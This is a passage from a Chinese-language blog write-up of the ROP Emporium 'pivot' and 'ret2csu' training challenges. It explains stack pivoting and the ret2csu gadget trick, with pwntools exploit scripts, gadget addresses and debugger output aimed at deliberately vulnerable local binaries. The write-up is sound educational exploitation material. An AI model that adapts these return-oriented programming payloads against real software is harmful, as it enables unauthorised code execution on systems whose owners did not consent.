<p>最后，可以根据它在<code>libpivot.so</code>中到<code>ret2win</code>的相对偏移来拿到<code>ret2win</code>的真实地址。这个相对偏移可以通过<code>nm libpivot.so</code>得到：前者在<code>0x0970</code>，后者在<code>0x0abe</code>，相差<code>0x14e</code>。最后我们还是利用 gadget 计算出<code>ret2win</code>的真实地址后，<code>call</code>一下即可。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;pivot: &#x27;</span>)</span><br><span class="line">a1 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(a1)</span><br><span class="line"></span><br><span class="line">foothold_plt = elf.plt[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">foothold_got = elf.got[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">pop_rax_ret = <span class="number">0x400b00</span></span><br><span class="line">mov_rax_rax = <span class="number">0x400b05</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x400900</span></span><br><span class="line">add_rax_rbp = <span class="number">0x400b09</span></span><br><span class="line">call_rax = <span class="number">0x40098e</span></span><br><span class="line"></span><br><span class="line">payload = flat([foothold_plt, pop_rax_ret, foothold_got, mov_rax_rax, pop_rbp_ret, <span class="number">0x14e</span>, add_rax_rbp, call_rax])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">xchg_rax_rsp = <span class="number">0x400b02</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>, pop_rax_ret, a1, xchg_rax_rsp])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>这题要求我们调用<code>ret2win</code>但是第三个参数必须是<code>0xdeadcafebabebeef</code>，并且 ROPgadget 几乎找不到有用的 gadget 比如<code>pop rdx; ret</code>。结合题目名可知本题需要采用<a target="_blank" rel="noopener" href="https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf">ret2csu</a>的技巧。</p>
<p>在<code>__libc_csu_init</code>中，有 gadget1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop     rbx</span><br><span class="line">pop     rbp</span><br><span class="line">pop     r12</span><br><span class="line">pop     r13</span><br><span class="line">pop     r14</span><br><span class="line">pop     r15</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<p>和 gadget2：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     rdx, r15</span><br><span class="line">mov     rsi, r14</span><br><span class="line">mov     edi, r13d</span><br><span class="line">call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure>

<p>可以看到，这里<code>rdx, rsi, edi</code>正好是 64 位下函数的前三个参数，而它们的值在这里来源于<code>r15, r14, r13d</code>，后三者又恰好可以被 gadget1 控制；而最后一句<code>call</code>中的<code>r12</code>和<code>rbx</code>我们同样可以在 gadget1 中控制。</p>
<p>然而，gadget2 不是以<code>ret</code>结尾的，这样我们必须考虑它后面的汇编代码依旧能正常执行下去：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add     rbx, 1</span><br><span class="line">cmp     rbp, rbx</span><br><span class="line">jnz     short loc_400880</span><br><span class="line"></span><br><span class="line">add     rsp, 8</span><br><span class="line">pop     rbx</span><br><span class="line">pop     rbp</span><br><span class="line">pop     r12</span><br><span class="line">pop     r13</span><br><span class="line">pop     r14</span><br><span class="line">pop     r15</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<p>这里为了让它继续向下执行，我们不妨让<code>rbx=0; rbp=1</code>；至于下面多余的<code>pop</code>就用填充处理掉就好了。</p>
<p>最后还有一个<code>call qword ptr [r12+rbx*8]</code>是我们可控的，但是这里尝试调用<code>ret2win</code>是会引起段错误的，不能直接调用。我们只有不引起段错误，才能让 gadget2 成功执行到<code>ret</code>，那么我们就想随便调用一个不会改变<code>rdx</code>的值的函数。</p>
<p>例如，可以调用<code>.dynamic</code>段的<code>_fini</code>，这个函数非常简单：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sub    rsp,0x8</span><br><span class="line">add    rsp,0x8</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>那么我们控制<code>r12</code><strong>指向</strong><code>_fini</code>即可，因为<code>rbx</code>会被我们设置为 0 所以不用考虑。注意是指向，也就是说<code>[r12]</code>才是<code>_fini</code>的地址，后者可以<code>gdb</code>中<code>info func</code>得到在<code>0x4008b4</code>，但是我们需要赋值给<code>r12</code>的实际上是指向<code>0x4008b4</code>这个地址的指针。</p>
<p>我们可以这样看：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20x &amp;_DYNAMIC</span><br><span class="line">0x600e20:	0x00000001	0x00000000	0x00000001	0x00000000</span><br><span class="line">0x600e30:	0x0000000c	0x00000000	0x00400560	0x00000000</span><br><span class="line">0x600e40:	0x0000000d	0x00000000	0x004008b4	0x00000000</span><br><span class="line">0x600e50:	0x00000019	0x00000000	0x00600e10	0x00000000</span><br><span class="line">0x600e60:	0x0000001b	0x00000000	0x00000008	0x00000000</span><br></pre></td></tr></table></figure>

<p>可以看到在<code>0x600e48</code>的指针指向<code>0x4008b4</code>，这就是我们要赋值给<code>r12</code>的值。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2win = elf.symbols[<span class="string">&#x27;ret2win&#x27;</span>]</span><br><span class="line">gadget1 = <span class="number">0x40089a</span></span><br><span class="line">gadget2 = <span class="number">0x400880</span></span><br><span class="line">fini_p = <span class="number">0x600e48</span></span><br><span class="line">arg3 = <span class="number">0xdeadcafebabebeef</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>, gadget1, <span class="number">0</span>, <span class="number">1</span>, fini_p, <span class="number">0</span>, <span class="number">0</span>, arg3, gadget2,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>, ret2win])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
</div><div class="article-licensing box"><div class="licensing-title"><p>ROPEmporium 学习</p><p><a href="https://signormercurio.me/post/ROPEmporium/">https://signormercurio.me/post/ROPEmporium/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>Mercury</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2019-12-09</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="" rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a><a class="link-muted mr-2" rel="tag" href="/tags/ROP/">ROP</a><a class="link-muted mr-2" rel="tag" href="/tags/ret2csu/">ret2csu</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/post/QTableSSpagination/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">QTable 服务端分页实践</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/post/How2heap/"><span class="level-item">how2heap 学习</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div class="content" id="valine-thread"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script>new Valine({
            el: '#valine-thread' ,
            appId: "RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",
            appKey: "sw2sEPOl4haCAXKUFYiBFMrR",
            placeholder: "Leave comments here...",
            avatar: "mm",
            
            meta: ["nick","mail","link"],
            pageSize: 10,
            lang: "en",
            visitor: true,
            highlight: true,
            
            
            
            
            
            requiredFields: ["nick","mail"],
        });</script></div></div></div><!--!--><div class="column column-right is-4-tablet is-4-desktop is-4-widescreen  order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#ret2win"><span class="level-left"><span class="level-item">1</span><span class="level-item">ret2win</span></span></a></li><li><a class="level is-mobile" href="#split"><span class="level-left"><span class="level-item">2</span><span class="level-item">split</span></span></a></li><li><a class="level is-mobile" href="#callme"><span class="level-left"><span class="level-item">3</span><span class="level-item">callme</span></span></a></li><li><a class="level is-mobile" href="#write4"><span class="level-left"><span class="level-item">4</span><span class="level-item">write4</span></span></a></li><li><a class="level is-mobile" href="#badchars"><span class="level-left"><span class="level-item">5</span><span class="level-item">badchars</span></span></a></li><li><a class="level is-mobile" href="#fluff"><span class="level-left"><span class="level-item">6</span><span class="level-item">fluff</span></span></a></li><li><a class="level is-mobile" href="#pivot"><span class="level-left"><span class="level-item">7</span><span class="level-item">pivot</span></span></a></li><li><a class="level is-mobile" href="#ret2csu"><span class="level-left"><span class="level-item">8</span><span class="level-item">ret2csu</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-10-05T14:24:56.000Z">2021-10-05</time></p><p class="title"><a href="/post/Intro2Crypto/">密码学笔记</a></p><p class="categories"><a href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-25T17:44:35.000Z">2021-09-25</time></p><p class="title"><a href="/post/Dockerfile2GKE/">从 Dockerfile 到 GKE：再探 GitHub Actions</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-23T09:03:42.000Z">2021-09-23</time></p><p class="title"><a href="/post/GCP/">Google Cloud Platform 基础</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-10T08:27:59.000Z">2021-09-10</time></p><p class="title"><a href="/post/Container/">云原生技术原理</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-08T07:50:13.000Z">2021-09-08</time></p><p class="title"><a href="/post/GoError/">Go Error 处理</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/favicon.png" alt="Lab on Mercury" height="28"></a><p class="is-size-7"><span>&copy; 2021 Mercury</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><div id="outdated"><h6>Your browser is out-of-date!</h6><p>Update your browser to view this website correctly.&amp;npsb;<a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p><p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">×</a></p></div><script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script><script>window.addEventListener("load", function () {
            outdatedBrowser({
                bgColor: '#f25648',
                color: '#ffffff',
                lowerThan: 'object-fit' // display on IE11 or below
            });
        });</script><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>